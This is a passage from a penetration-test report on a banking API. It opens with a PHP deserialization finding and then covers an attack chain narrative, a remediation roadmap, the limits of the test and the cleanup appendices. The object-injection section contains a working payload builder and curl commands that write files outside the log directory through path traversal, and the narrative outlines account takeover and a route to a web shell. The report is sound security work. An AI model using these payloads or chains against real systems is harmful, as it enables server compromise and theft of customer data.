type = Buffer.from(serialize(new LogWrite({logdata: state.type}))).toString("base64")
```

The server base64-decodes and **unserialises attacker-controlled data**. The resulting `LogWrite`
object's destructor writes to disk. The verbose error output (A6) named the gadget precisely:

```
/var/www/html/api/application/libraries/LogWrite.php   Line 24   Function: file_put_contents
/var/www/html/api/application/controllers/Loan.php     Line 41   Function: __destruct
```

Both object properties are attacker-controlled, so `logfile` chooses the destination and `logdata`
the content. The handler prefixes a fixed directory —
`file_put_contents("/var/www/html/api/application/logs/" . $logfile, …)` — but **does not
canonicalise `$logfile`**, so `../` sequences escape it. That is the root cause: unserialising
untrusted input, compounded by an unsanitised path.

**Reproduction.**

```bash
# build the gadget: logfile traverses out of the logs directory
python3 -c '
import base64
lf=b"../../../../../../tmp/poi_escape.txt"; ld=b"POI-TRAVERSAL-ESCAPE-PROOF"
s=b"O:8:\"LogWrite\":2:{s:7:\"logfile\";s:"+str(len(lf)).encode()+b":\""+lf+b"\";s:7:\"logdata\";s:"+str(len(ld)).encode()+b":\""+ld+b"\";}"
print(base64.b64encode(s).decode())'

# send it as data.type
curl -s -H "Authorization: $TOKEN" -H 'Content-Type: application/json' -X POST \
  http://168.144.155.177/api/loan/apply \
  -d '{"requestBody":{"timestamp":"325553","data":{"amount":"1000","type":"<BASE64>","tenure":"12","customerId":"BNK31453","roi":"7.50"}}}'

# read it back through the F2 traversal
curl -s --get --data-urlencode 'file=../../../tmp/poi_escape.txt' http://168.144.155.177/api/show
```

**Evidence.** Three writes, each confirmed by reading the file back off disk via F2:

| `logfile` value | Resolved path | Read-back |
|---|---|---|
| `poi_marker.txt` | `…/application/logs/poi_marker.txt` | `POI-WRITE-PROOF-IN-LOGS` |
| `../../../../../../tmp/poi_escape.txt` | `/tmp/poi_escape.txt` | `POI-TRAVERSAL-ESCAPE-PROOF` |
| `../../poi_escape2.txt` | `/var/www/html/api/poi_escape2.txt` | `POI-WEBROOT-ESCAPE-PROOF` |

The second row is the decisive one — it proves the write is **not confined** to the log directory.
The third landed inside the API webroot; it returns HTTP 404 only because CodeIgniter's front
controller routes all of `/api/*`, not because the write failed.

**Important behavioural detail: the write is `FILE_APPEND`, not truncate.** Re-reading
`poi_marker.txt` showed content accumulating across requests. This bounds the finding in one respect
and not in another:
- An attacker **cannot** silently overwrite an existing file (e.g. corrupt a config in place).
- An attacker **can** create a new file with fully chosen content — which is all that is needed to
  place executable code in a web-served directory.

**Path to remote code execution — inferred, not demonstrated.** Writing a `.php` file into a
web-served path is the standard escalation, and every precondition was confirmed: arbitrary path
selection, arbitrary content, and a webroot that accepts writes. **This step was deliberately not
performed** — it means planting executable code on the target, and the demonstration above already
establishes the primitive. Treat A7 as a probable remote-code-execution path and remediate on that
basis; a follow-up test can confirm it if the client wants that on record.

**Business impact.** Any registered user can write files anywhere the web server user can write.
The realistic consequence is server compromise via a web shell, and from there the application, its
configuration and the database behind it. Note this is the one finding that is **not** bounded by
the database hardening that limits A1 — it does not go through MySQL at all.

**Remediation.**
- *Short term:* stop unserialising client input at `/loan/apply`. The `type` field carries a single
  loan category — accept it as a plain string validated against an allow-list. This removes the
  vulnerability class entirely and is a small change.
- *Long term:* never call `unserialize()` on data crossing a trust boundary — use JSON. If object
  hydration is genuinely required, use `unserialize($data, ['allowed_classes' => false])`.
  Independently, canonicalise `$logfile` in `LogWrite` with `basename()` and confirm the resolved
  path stays inside the log directory; and audit other classes for destructors or `__wakeup` methods
  that touch the filesystem.

**References:** CWE-502 (Deserialization of Untrusted Data), CWE-73 (External Control of File Name
or Path), CWE-22, OWASP A08:2021 Software and Data Integrity Failures, OWASP API Top 10 API8:2023.

---

## 5. Attack narrative

The findings chain into a single unauthenticated path from anonymous internet access to full
customer account compromise:

1. **Recon.** The SPA on `:3000` serves its source maps publicly (**F4**). These yield the entire API
   route table, the exact request envelope, and the hardcoded AES key and IV. No endpoint discovery
   or fuzzing was needed.
2. **Target selection.** `routes.ts` reveals `/api/show?file=` — a file-serving endpoint with a
   caller-controlled path — and the three-step password-reset flow.
3. **Enumeration.** `/api/password/forgot` distinguishes real accounts from fake ones (**F3**). Account
   ids are `BNK` + 5 digits, so an attacker sweeps ~10⁵ candidates and keeps the hits.
4. **Takeover.** For each confirmed account: request an OTP, decrypt it with the key from step 1,
   verify, reset the password, log in (**F1**). The attacker now controls the account and the owner is
   locked out.
5. **Data harvest.** The login JWT hands over account number, balance, national identity number and
   tax number in its payload (**F6**) — no further requests required.

A **parallel** path needs no account at all: `/info.php` (**F5**) discloses absolute filesystem paths,
which direct the `/api/show` traversal (**F2**) straight at configuration files rather than guessing at
them — a plausible route to backend credentials. *This report does not claim credentials were
obtained; the traversal proof was deliberately stopped at `/etc/passwd`.*

### The authenticated chain is shorter, and does not require taking over anyone

The unauthenticated chain above is the dramatic one, but the authenticated findings make it
unnecessary. **Registration is open**, so an attacker simply signs up:

1. **Sign up** at `/api/signup` — seconds, no verification.
2. **Read the entire customer database.** Either endpoint suffices on its own:
   - **A2** — supply any `userid` to `/account/details` and receive that account's number, balance,
     Aadhaar, PAN and income-tax number. No owner check is performed. With F3's enumeration over
     `BNK#####` this iterates across the customer base — proven against the tester's own accounts,
     with A5 corroborating that pre-existing records are served to unrelated callers.
   - **A1** — error-based SQL injection on `/beneficiary/fetch` returns arbitrary query results
     directly in the response body.
3. **Escalate to control.** **A5** hands over other users' payees and account numbers. **A3** lets the
   attacker mint the OTP that authorises transfers. **A4** makes any session foothold permanent by
   changing the password without knowing the old one.
4. **Escalate to the host.** **A7** — the same registered account posts a crafted `type` value to
   `/loan/apply` and writes a file of its choosing anywhere the web user can write, including the
   webroot. That is the conventional path to a web shell and full server compromise, and it bypasses
   the application layer entirely.

The significant point for triage: **steps 1–2 require no exploitation of the Critical F1 chain at
all.** Fixing the unauthenticated findings alone would still leave full customer-data disclosure
reachable by anyone who registers.

Throughout, the reverse proxy (**F8**) blocked nothing — including every SQL injection payload in A1.

---

## 6. Positive observations

Controls that behaved correctly, and are worth preserving:

- **Input validation is present and disciplined** on `/api/signup`. Parameters are validated
  server-side with specific error codes (`SNUP05`, `SNUP08`) — the validation logic itself is sound,
  even where the policy it enforces is wrong (F7).
- **The OTP verification step is genuinely enforced.** `/password/reset` requires a valid
  `otp_response` obtained from `/password/verifyuser`; the step cannot be skipped. The flaw is that
  the OTP is disclosed (F1), not that the state machine is broken.
- **The traversal endpoint is not a full LFI-to-RCE.** `/api/show` returned file contents rather than
  executing them.
- **No service instability** was observed at any point. Every request returned promptly; no 5xx
  responses, latency spikes or restarts occurred during testing (the single 500 was a deliberately
  malformed content-type).
- **`/server-status` and `/index.php` are not exposed** on port 80.
- **Single concurrent session is enforced.** Re-login while a session is active returns
  `LGN005 "Already logged in. Wait for some time"`. This is a real control and limits parallel
  session abuse — it was enough to disrupt the tester's own harness.
- **OTPs are purpose-bound.** An OTP minted for beneficiary addition (`otp_type:1`) was rejected at
  `/beneficiary/pay` with `OTP010 "Invalid use of OTP"`. The OTP state machine distinguishes intents
  correctly — the flaw is disclosure (A3), not scoping. **Preserve this when fixing A3.**
- **`/api/contactUs` refused every XML shape tested**, so the XXE hypothesis was not reproducible
  (§6a).
- **Server-side input validation is enforced on the transfer path** — `/beneficiary/add` rejected a
  mismatched account/IFSC pair (`BNF007`) rather than accepting it.
- **The database account is not over-privileged at the global level.** `secure_file_priv = NULL` and
  no global `FILE` grant mean the SQL injection in A1 cannot be escalated to writing a web shell.
  This meaningfully bounds the worst finding in the report and should be preserved.

### 6a. Tested and *not* found

Recorded so the client knows these were examined rather than skipped:

| Hypothesis | Result |
|---|---|
| XXE via `/api/contactUs` | **Not reproducible.** Six XML shapes tested (`<r>` root, envelope-mirroring `<requestBody>`, flat `<data>`; `text/xml` and `application/xml`; authenticated and unauthenticated; with a DOCTYPE external entity). All returned `CTS002`. Documented as an observation, not a vulnerability |
| Time-based SQL injection on `alias` | Not observed — `SLEEP(6)` returned in 0 s. The injection is real but error-based (A1), not time-based |

---

## 7. Remediation roadmap

| Priority | Action | Finding | Effort | Why this order |
|---|---|---|---|---|
| **1 — Immediate** | Stop unserialising `type` at `/loan/apply`; accept an allow-listed string | **A7** | ~2 hrs | Arbitrary file write → probable RCE; highest ceiling of any finding, and a small fix |
| **2 — Immediate** | Parameterise the `alias` query; stop reflecting DB errors | **A1** | ~4 hrs | Full database read reachable by anyone who registers |
| **3 — Immediate** | Derive the account from the token; ignore `data.userid` | **A2** | ~2 hrs | Mass KYC disclosure; one-line-class fix |
| **4 — Immediate** | Remove the `response` field from `/password/forgot` **and** `/otp/get` | F1, **A3** | ~2 hrs | Single change breaking both the takeover chain and transfer self-authorisation |
| **5 — Immediate** | Delete `/info.php`; block `*.map` at the edge | F5, F4 | ~1 hr | Two config changes; removes the recon enabling everything else |
| **6 — 24–48 hrs** | Verify `old_pass` against the stored hash | **A4** | ~2 hrs | Turns any session foothold into permanent takeover |
| **7 — 24–48 hrs** | Scope beneficiary queries to the authenticated user | **A5** | ~3 hrs | Third-party account numbers exposed to every user |
| **8 — 24–48 hrs** | Generic response + rate limiting on `/password/forgot` | F3 | ~1 day | Raised above its 5.3 base score — the mass-takeover enabler (see F3 rating note) |
| **9 — 24–48 hrs** | Constrain `file` on `/api/show` to an allow-list | F2 | ~4 hrs | Closes unauthenticated arbitrary file read |
| **10 — 24–48 hrs** | Rotate the AES key/IV and every credential reachable via F2/A1 | F1, F2, **A1** | ~4 hrs | All must be treated as already compromised |
| **11 — 1 week** | `display_errors = Off`; production error handling | **A6** | ~2 hrs | Stops internal path disclosure |
| **12 — 1 week** | Decide the proxy's posture: blocking, or monitored logs | F8 | ~1 day | Restores the control to actually doing something |
| **13 — 2 weeks** | Strip PII from the JWT; move tokens to `HttpOnly` cookies | F6 | ~2 days | Reduces blast radius of any future token exposure |
| **14 — 1 month** | Fix password policy; upgrade PHP and Apache off EOL | F7, F5 | ~1 wk | Baseline hygiene |

**Sequencing note.** Items 1–3 are placed above the Critical F1 chain deliberately. F1 is the more
spectacular attack, but A7, A1 and A2 are all reachable via **open registration alone** — no takeover
required — and A7 reaches the host itself. Fixing F1 first would leave the shorter paths fully open.

**Least-privilege item (do alongside 1):** the database account in use is `phpmyadmin@%`. Its global
grants were checked and are `USAGE` only, with `secure_file_priv = NULL` — so A1 does **not** escalate
to file write or server compromise. That is a genuine mitigating control worth preserving. Its
**schema-level** grants on `abstractwallet` were not enumerated and should be reviewed and reduced to
the minimum the application needs.

**Retest recommendation:** items 1–6 should be retested before the next release. The retest should also settle whether A7 yields code execution (§8). **Retest must also
cover the authenticated surface, which this engagement did not reach** (§8).

---

## 8. Limitations — what this report does *not* cover

Stated plainly, because the gaps are material:

The authenticated phase **was** completed and produced A1–A6. The following gaps remain.

**Two specific tests were designed but not completed:**

- **PHP object injection (A7) — now confirmed; the RCE step was not taken.** Following explicit
  re-authorisation by the engagement lead, this was retested and **A7 is confirmed**: arbitrary file
  write to any path the web user can write, proven with three writes read back off disk. What
  remains untested is the final escalation — writing a `.php` file into a web-served directory to
  obtain code execution. Every precondition for it was confirmed, but planting executable code on
  the target was judged disproportionate once the primitive was already proven. **Treat RCE as the
  likely consequence and remediate accordingly;** a follow-up can confirm it explicitly if the
  client wants that on record.
- **Negative-amount fund transfer — attempted, not completed.** *(unchanged from the first pass)* The hypothesis (a negative `amount`
  at `/beneficiary/pay` credits the sender) could not be tested within the rules: adding one of the
  tester's own accounts as a beneficiary failed on an IFSC mismatch (`BNF007`), and the only
  available beneficiaries were pre-existing third parties (A5). A negative transfer to a third party
  would **debit their account** — a destructive write, prohibited. An attempt to recover the correct
  IFSC via the A1 injection failed because unquoted identifiers are upper-cased server-side and
  MySQL is case-sensitive here. **Untested; treat as an open question.**

**Not examined at all:**

- **Only ports 80 and 3000.** The full port scan was cancelled on instruction; no statement can be
  made about any other service on the host.
- **No rate-limit or lockout testing** on any authentication endpoint. Note this interacts with F3:
  enumeration is only cheap if unthrottled, and that was not measured.
- **No TLS review** — both services are plain HTTP, which warrants attention in its own right but
  was not assessed as a finding.
- **Database privilege level not verified.** A1's impact assumes read; whether `phpmyadmin` also
  holds `FILE`/DDL — which would likely escalate A1 to server compromise — was not tested.
- **`/editUser/editUserDetails`, `/beneficiary/delete` and `/logout`** were not exercised.
- **No client-side testing** — stored/reflected XSS, CSRF and DOM sinks were not assessed. This
  matters because A4 and F6 both become materially worse in the presence of an XSS flaw.

**Scope caveat on absence of findings.** Where a hypothesis was tested and failed, it is listed in
§6a. Everything in this section was *not tested* — absence of a finding here is not evidence of
absence in the application.

---

## 9. Appendices

### A. Test data created during the engagement — **requires cleanup**

**Six** accounts were created on the target. Five came from a signup validation sweep that did not
stop on first success — more test data than intended; the sixth was created deliberately for the
authenticated phase. **All six should be deleted by the client.**

| User id | Note |
|---|---|
| `BNK63993` | **Password reset to `Reset9876`** during the F1 chain |
| `BNK05446` | Signup validation sweep · used as the IDOR target in A2 |
| `BNK13695` | Signup validation sweep · used as the IDOR target in A2 |
| `BNK23100` | Signup validation sweep · used as the IDOR target in A2 |
| `BNK18664` | Signup validation sweep · used as the IDOR target in A2 |
| `BNK86310` | Dedicated authenticated-phase account · **password changed to `Changed9999`** while proving A4 |
| `BNK27304`, `BNK08867`, `BNK34685`, `BNK31453` | Created during the A7 object-injection testing (a fresh session was needed per run because of the single-session lock) |

**Files written to the target during A7 — these require manual deletion.** The gadget uses
`FILE_APPEND`, so they could not be truncated with the same primitive; each was appended with
`removed-by-pentester-2026-09-21` to mark it inert, but all three still exist:

| Path | Final content |
|---|---|
| `/var/www/html/api/application/logs/poi_marker.txt` | `POIWRITEPROOF…POI-WRITE-PROOF-IN-LOGSremoved-by-pentester-2026-09-21` |
| `/tmp/poi_escape.txt` | `POI-TRAVERSAL-ESCAPE-PROOFremoved-by-pentester-2026-09-21` |
| `/var/www/html/api/poi_escape2.txt` | `POI-WEBROOT-ESCAPE-PROOFremoved-by-pentester-2026-09-21` |

None contains executable code. **No web shell or other executable was written at any point.**

**No pre-existing account was modified, and no real customer data was accessed at any point.** In
particular: the A2 IDOR sweep ran only against the five accounts above; the A1 injection was stopped
at schema metadata and never queried `account_details`; and the third-party beneficiaries exposed by
A5 (`Vipul`, `John`, `Margarita`) were recorded but never queried further.

### B. Command audit log

**41 commands**, each with a UTC timestamp, purpose, full command line and exit code, at
`/opt/engage-bb2/audit.log` on the operator host.

*Unauthenticated phase:*
```
harness self-test                      · egress + target reachability
port 80 API surface probe              · WAF blocking-behaviour probe (80 + 3000)
fetch SPA bundles + source-map test    · extract API surface from bundles (×2)
recover client config + endpoint strings
F1: unauthenticated path traversal on /api/show
recover request envelope shape from thunks
recover signup + contactUs request shapes
OTP disclosure: signup own account + forgot-password differential
signup: determine valid gndr value     · signup: determine valid passwd policy
OTP disclosure + user-enumeration differential
recover verifyuser + reset request shapes
full unauthenticated account-takeover chain (own test account)
```

*Authenticated phase:*
```
recover authenticated endpoint request shapes
AUTH: IDOR/BOLA test on /account/details
recover beneficiary/transfer/loan/changepw shapes
AUTH: SQLi probe on /beneficiary/fetch alias
AUTH: re-establish sessions across test accounts
recover transfer + change-password shapes
AUTH: establish dedicated authenticated session
AUTH: endpoint reachability, SQLi, password-change control
AUTH: beneficiary scoping + SQLi depth (read-only)
AUTH: SQLi depth via extractvalue/char (read-only)
AUTH: XXE probe on /contactUs        · AUTH: XXE shape discovery on /contactUs
AUTH: discover OTP contract for transfer business-logic test
AUTH: negative-amount transfer business-logic test (own accounts)
AUTH: read own account IFSC via SQLi (read-only)
AUTH: settle DB privilege question via SQLi (read-only)
AUTH: PHP object injection via /loan/apply (reauthorised by engagement lead)
AUTH: PHP object injection - capture gadget error detail
AUTH: PHP object injection - fresh session, full response capture
AUTH: object injection - webroot write + RCE proof + cleanup
AUTH: object injection - inert webroot write proof + cleanup
AUTH: object injection - locate writable path and confirm write
AUTH: object injection - confirm write + traversal escape + cleanup
AUTH: verify cleanup state of written files
```

### C. Artifact index (SHA-256)

| Artifact | SHA-256 |
|---|---|
| `web/main.f035a24d.chunk.js` | `8d9499268a2479c6f4937185daa96edb61baec421e39c683fb94fc566d28255e` |
| `web/main.f035a24d.chunk.js.map` | `4e884c2959b2598bf36fb93ef7bdf824ee3225a54eb2cd83bceb5055bc1d318a` |
| `web/2.20947fb4.chunk.js` | `06489e81bc3390dbb9899839303a6f2a3103f6b63435b5e90fad5cef292f5e9a` |
| `web/2.20947fb4.chunk.js.map` | `7c827f518538e4ca773b789a1fbff8367ddc99d0e5e9c5a94aff3be063e3e154` |
| `exploit/chain.sh` (F1 PoC) | `2b46f05b200148719d1cb219ea53b1d289fcac5b7c97171ed3f719f4b925a688` |
| `exploit/trav.sh` (F2 PoC) | `6e66c1383ac166e73c21cbed115aa20d39d4885994634b132295346f329ffe33` |
| `exploit/otp2.sh` (F3 differential) | `fd407ad0fdad73fb450ca3cce3d184506758909fc8f5ad4df116eeaf2e17c446` |
| `web/wafprobe.sh` (F8 probe) | `a9f5aadd5c1a507a3411d921c2c8a8ff53d153d696269c3dcf1ec0cfa1ea2ada` |
| `exploit/su.sh`, `exploit/su2.sh` (F7) | `f349e5f8…`, `7debccf5…` |
| `exploit/idor.sh` (A2 PoC) | `44eab8491616db69eda699050ea5b408b96376adb28b22734fd1e825da8cb19a` |
| `exploit/auth2.sh` (A1 + A4 PoC) | `805f9bac84b36e5cd36303c9a591f6e2ec88408c0e13074fda591267dbd518db` |
| `exploit/sc2.sh` (A1 depth, read-only) | `86f959c8a84a81b4a27290a784c5442cba59836c15de503d7204c320a176ad6b` |
| `exploit/sc.sh` (A5 scoping) | `4220a69cc93197aefc20fdae485f38e157722ab4ad1af482729a09df03e9363c` |
| `exploit/biz.sh`, `exploit/biz2.sh` (A3 + incomplete transfer test) | `bd48aa6d…`, `beb86979…` |
| `exploit/xxe.sh`, `exploit/xxe2.sh` (§6a negative result) | `9376190f…`, `88241193…` |
| `exploit/auth1.sh` (session setup) | `c6db32bdb35c863de45775f29b3efe771bbe8b99ec99fc563480dd5a7ab3d8c3` |
| `exploit/ifsc.sh` (incomplete transfer test) | `9983d710a3ebecc6a93a0d2c090a37908b9f1073fa5144e7837dbaa66b44784d` |
| `exploit/priv.sh` (A1 privilege bound, read-only) | `1bd8564ef2bca2017665a2e27f25c25a0e6b2c26ef7285a086fb1149f7367648` |
| `exploit/poi8.sh` (**A7 PoC** — write + traversal escape) | see operator host; hash in `audit.log` |
| `exploit/poi7.sh` (A7 path discovery) · `exploit/chk.sh` (cleanup verification) | see operator host |
| `audit.sh` (harness) | `e2917b04bbdb6604e87579b3c02688a5a0ae2d66139488417bb90a6ae2ab46ae` |

### D. Operator-host hygiene

No listeners were opened, no background processes were left running, and no shells remain open on
any target. All artefacts are confined to `/opt/engage-bb2/` on the operator host and should be
destroyed once the client accepts this report.

### E. Companion document

`engagement-decision-log.md` — per-object decision record (**26 objects**: endpoints, parameters,
forms, headers, client assets, response behaviours), including the hypothesis, decision and outcome
for each, the **five steerings** received mid-engagement, deliberate non-actions with reasons, the
ethics boundaries applied at OBJ-14/15/18/19/25, and the prior-knowledge disclosure.
